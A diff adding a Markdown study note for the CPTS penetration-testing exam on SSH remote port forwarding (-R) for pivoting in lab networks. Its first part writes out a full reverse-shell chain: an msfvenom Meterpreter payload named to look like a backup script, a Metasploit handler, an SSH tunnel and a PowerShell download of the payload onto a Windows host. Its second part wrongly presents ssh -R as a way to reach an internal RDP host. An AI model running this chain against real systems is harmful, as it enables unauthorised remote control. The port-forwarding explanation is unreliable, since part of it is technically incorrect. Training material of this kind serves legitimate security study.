@@ -1,0 +1,151 @@
+🔄 Remote Port Forwarding (SSH -R) — CPTS Breakdown
+This is the opposite of what we did in dynamic SOCKS proxying. Now, we’re forwarding from the target’s network back to us.
+
+🧠 Scenario Recap
+You compromised an Ubuntu pivot box that:
+
+Has access to a Windows target on a private internal network 172.16.5.x.
+
+That Windows box can’t reach your attacker machine directly (no route to 10.10.x.x or 10.129.x.x).
+
+You want a reverse shell from the Windows box → to your attack box (not just RDP or remote desktop).
+
+But:
+
+❌ The Windows target can’t reach your box directly. ✅ The Ubuntu pivot can reach both: your attack box and the Windows target.
+
+🛠️ What You Do
+🔹 Step 1: Create a Payload
+bash
+Copy
+Edit
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
+This makes the payload connect back to the Ubuntu pivot (not you directly).
+
+🔹 Step 2: Start Your Metasploit Handler
+bash
+Copy
+Edit
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 8000
+run
+You're listening on port 8000 locally, ready for the final forwarded connection.
+
+🔹 Step 3: Forward the Remote Port Back to You
+From your attack box, run:
+
+bash
+Copy
+Edit
+ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<Pivot-IP> -vN
+That command:
+
+Listens on Ubuntu pivot: 172.16.5.129:8080
+
+Forwards to you: 0.0.0.0:8000 (your Metasploit listener)
+
+Makes it so anything connecting to Ubuntu on 8080 (like Windows payload)... gets tunneled to your Metasploit listener.
+
+🔹 Step 4: Deliver the Payload
+Either:
+
+Use PowerShell:
+
+powershell
+Copy
+Edit
+Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+Or open it in a browser on the Windows host.
+
+🔹 Step 5: Execute Payload & Profit
+Payload connects to Ubuntu (on 8080).
+
+SSH forwards that to your box (on 8000).
+
+You catch the Meterpreter shell.
+
+Your listener will show:
+
+scss
+Copy
+Edit
+[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1)
+(127.0.0.1 is shown because you’re receiving it over a local SSH socket, not directly from the Windows target.)
+
+📌 Difference vs Dynamic Port Forwarding (SOCKS)
+🔄 Type	Description
+Dynamic (SOCKS) -D	You scan or access outbound through the pivot — like Nmap or RDP’ing to internal hosts.
+Remote Forward -R	You make a service (like reverse shell) that comes inbound from the victim, travel through the pivot back to you.
+Local Forward -L	You access an internal service on the pivot from your local box.
+TL;DR:
+-L: Pull internal services to you (e.g., MySQL).
+
+-D: Browse/scan from inside the internal network.
+
+-R: Catch reverse shells when the victim can’t see your box.
+
+🧠 When to Use This in CPTS
+This 100% belongs in the "pivoted access" section of your report. Even if the flag is captured via RDP, if you used -R to catch a Meterpreter shell, document it as a technique leveraged for deeper access or tool execution.
+
+Bonus points if you:
+
+Chain multiple techniques together.
+
+Explain why you had to pivot this way (e.g., no route from victim to attacker).
+
+
+This is the exact scenario for using Remote Port Forwarding (-R) when you want to "pull" access from inside to you — like pivoting RDP access, a reverse shell, or any restricted internal service.
+
+🔁 Let’s walk through your exact example:
+Scenario:
+You found RDP open on 172.16.8.20.
+
+You're on your attack box (10.10.x.x).
+
+There's no direct route from you → 172.16.8.20.
+
+But you've got an intermediate Ubuntu box (pivot) at 172.16.8.5 you can SSH into.
+
+✅ What you do:
+🔹 Step 1: Remote Forward RDP to Yourself
+bash
+Copy
+Edit
+ssh -R 172.16.8.5:3389:172.16.8.20:3389 ubuntu@172.16.8.5 -vN
+This tells the Ubuntu box to listen on 172.16.8.5:3389.
+
+And forward all incoming RDP traffic to 172.16.8.20:3389 (Windows host).
+
+You now have an RDP bridge via the pivot.
+
+🔹 Step 2: Connect to RDP through that bridge
+bash
+Copy
+Edit
+xfreerdp /v:172.16.8.5 /u:victor /p:pass@123
+BAM 💥 — You’re inside 172.16.8.20 without ever directly touching it.
+
+🔍 What’s Really Happening?
+You can’t reach 172.16.8.20 directly.
+
+But 172.16.8.5 (your pivot) can.
+
+So you make 172.16.8.5 act like a proxy for that port, and access that instead.
+
+🧠 Bonus Tip:
+Want to be extra slick? Use an alternate port so you don’t mess with real services:
+
+bash
+Copy
+Edit
+ssh -R 172.16.8.5:4444:172.16.8.20:3389 ubuntu@172.16.8.5 -vN
+xfreerdp /v:172.16.8.5:4444 /u:victor /p:pass@123
+✅ TL;DR:
+This is not dynamic port forwarding (SOCKS).
+
+This is you pulling internal access back through the pivot to your box.
+
+Works great for RDP, reverse shells, or any TCP service.
